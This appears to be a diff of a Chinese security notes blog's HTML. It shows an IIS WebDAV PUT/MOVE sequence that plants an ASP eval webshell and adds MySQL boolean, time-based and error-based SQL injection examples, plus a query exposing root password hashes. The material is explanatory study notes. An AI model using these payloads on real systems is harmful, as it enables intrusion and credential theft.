@@ -247,7 +247,15 @@ Cacha-Control:<span class="keyword">private</span>
 <span class="string">Host:</span>www.xxxx.com
 Content-<span class="string">Length:</span><span class="number">26</span>
 &lt;%eval(request(<span class="string">"cmd"</span>))%&gt;
-</code></pre><p>  返回：<br>    HTTP/1.1 200 OK<br>      Date:Fri,01 Jan 2011 04:23:39 GMT<br>      Server: Microsoft-IIS/6.0<br>      X-Powered-By:ASP.NET<br>    location：<strong><strong><em>*</em></strong></strong><br>    Allow:OPTION,TRACE,GET,HEAD,DELETE,PUT,POST,COPY,MOVE…<br>    //上传成功<br>-通过MOVE改名(需要IIS勾选允许脚本资源访问复选框)：</p>
+</code></pre><p>  返回：</p>
+<pre><code>HTTP/1.1 200 OK
+  Date:Fri,01 Jan 2011 04:23:39 GMT
+  Server: Microsoft-IIS/6.0
+  X-Powered-By:ASP.NET
+location：<span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span>
+Allow:OPTION,TRACE,GET,HEAD,DELETE,PUT,POST,COPY,MOVE...
+//上传成功
+</code></pre><p>-通过MOVE改名(需要IIS勾选允许脚本资源访问复选框)：</p>
 <pre><code>MOVE/test<span class="class">.txt</span> HTTP/<span class="number">1.1</span>
 Host:wwww<span class="class">.xxxx</span><span class="class">.com</span>
 Destination:http:<span class="comment">//www.<span class="label">xxxx.com/webshell.asp</span></span>
@@ -334,9 +342,24 @@ alert(xmlDoc);
       
         <h2>基于布尔的盲注</h2>
 
-<pre><code>mysql&gt; select username <span class="keyword">from</span> admin <span class="keyword">where</span> <span class="property">id</span> = <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span>;
-mysql&gt; select username <span class="keyword">from</span> admin <span class="keyword">where</span> <span class="property">id</span> = <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span>;
-</code></pre>
+<pre><code>mysql&gt; <span class="keyword">select</span> username <span class="keyword">from</span> admin <span class="keyword">where</span> id = <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span>;
+mysql&gt; <span class="keyword">select</span> username <span class="keyword">from</span> admin <span class="keyword">where</span> id = <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span>;<span class="comment">//根据返回内容的真假判断是否存在注入</span>
+</code></pre><h2>基于时间的盲注</h2>
+
+<pre><code>mysql&gt; select username from admin where id = <span class="number">1</span> or <span class="keyword">if</span><span class="params">(length<span class="params">(user)</span>&gt;<span class="number">10</span>,sleep<span class="params">(<span class="number">3</span>)</span>,<span class="number">0</span>)</span>;
+mysql&gt; select username from admin where id = <span class="number">1</span> or <span class="keyword">if</span><span class="params">(ascii<span class="params">(mid<span class="params">(lower<span class="params">(user<span class="params">()</span>)</span>)</span>,<span class="number">1</span>,<span class="number">1</span>)</span>=<span class="number">114</span>,sleep<span class="params">(<span class="number">3</span>)</span>,<span class="number">0</span>)</span>;
+<span class="comment">//如果if中条件成立返回延时</span>
+</code></pre><p></p><h2>基于报错的注入</h2><p></p>
+<h4>rand和group的冲突</h4>
+
+<pre><code>mysql&gt; <span class="keyword">select</span> user <span class="keyword">from</span> mysql.user <span class="built_in">where</span> user=<span class="string">"test"</span> <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(*),concat(left(<span class="built_in">rand</span>(),<span class="number">3</span>),version())x <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">group</span> <span class="keyword">by</span> x)b;
+
+mysql&gt; <span class="keyword">select</span> user <span class="keyword">from</span> mysql.user <span class="built_in">where</span> user=<span class="string">"test"</span> <span class="built_in">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(*),concat_ws(<span class="string">":"</span>,user(),version(),<span class="built_in">floor</span>(<span class="built_in">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">group</span> <span class="keyword">by</span> x) b);
+
+<span class="comment">//x的语句为:concat_ws(":",user(),version(),floor(rand(0)*2)),rand()是不允许放在group by之后的所以用group by x 之后报错 显示出 user，version信息</span>
+</code></pre><p>遇到的问题：<br>1.如果想用报错注入显示database()信息时，不能为NULL，必须使用use databasename；选择一个数据库。<br>2.注意上述语句中使用 union 和 and 的区别 一个括号。<br>3.floor(rand(0)<em>2)其中乘以三乘以4都是可以的，2是一个习惯用法。<br>4.除了floor(rand(0)</em>3)，使用left(rand(),3)之类不确定的数值跟在group by之后也是可以报错的。</p>
+<p><em>以上内容使用的数据库版本为mysql 5.6.17.</em></p>
+
       
     </div>
     
@@ -472,7 +495,18 @@ mysql&gt; select <span class="built_in">concat</span><span class="params">(<span
 
 concat_ws<span class="params">()</span>
 mysql&gt; select concat_ws<span class="params">(<span class="string">":"</span>,user,password)</span> from mysql.user where user = <span class="string">"root"</span>; <span class="comment">//显示 root:"对应用户密码散列值"</span>
-</code></pre>
+
+rand<span class="params">()</span>
+mysql&gt; select rand<span class="params">()</span>;<span class="comment">//0~1之间的随机数</span>
+
+<span class="built_in">floor</span><span class="params">()</span>
+mysql&gt; select <span class="built_in">floor</span><span class="params">(<span class="number">1.1</span>)</span>;<span class="comment">//向下取整</span>
+
+group by<span class="params">()</span>
+mysql&gt; select type,<span class="built_in">max</span><span class="params">(price)</span> from price_info group by type;
+<span class="comment">//先按tpye分组，建立若干临时表，然后在每一个临时表示执行max()函数</span>
+</code></pre><p><em>以上内容使用的数据库版本为mysql 5.6.17.</em></p>
+
       
     </div>
     
@@ -561,7 +595,8 @@ mysql&gt; alter table admin renanme admin5<span class="comment">;//重命名表<
 <pre><code><span class="operator">select <span class="keyword">id</span>,username <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> <span class="number">1</span>=<span class="number">1</span> ;</span>
 <span class="operator"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">admin</span> (username,tel1) <span class="keyword">values</span>(<span class="string">"admin"</span>,<span class="string">"13000000000"</span>);</span>//除自增和带有默认值的字段外，NOT NULL的字段必须要进行赋值.
 <span class="operator"><span class="keyword">delete</span> <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username = <span class="string">"admin"</span>;</span>//更新
-</code></pre>
+</code></pre><p><em>以上内容使用的数据库版本为mysql 5.6.17.</em></p>
+
       
     </div>
     
@@ -632,6 +667,7 @@ mysql&gt; revoke all privileges <span class="function_start"><span class="keywor
 
 <pre><code>mysql&gt; flush privileges<span class="comment">;</span>
 </code></pre><p><a href="http://drops.wooyun.org/tips/2245" target="_blank" rel="external">权限分配细则–乌云知识库</a></p>
+<p><em>以上内容使用的数据库版本为mysql 5.6.17.</em></p>
 
       
     </div>
@@ -713,7 +749,8 @@ mysql&gt;update mysql.user <span class="built_in">set</span> password = password
 <pre><code>mysql&gt;drop <span class="keyword">user</span> test;  //删除名为test的<span class="keyword">user</span>
 
 mysql&gt;delete <span class="keyword">from</span> mysql.<span class="keyword">user</span> where <span class="keyword">user</span> = <span class="string">"test"</span> //不知道和上面的有什么区别
-</code></pre>
+</code></pre><p><em>以上内容使用的数据库版本为mysql 5.6.17.</em></p>
+
       
     </div>
     
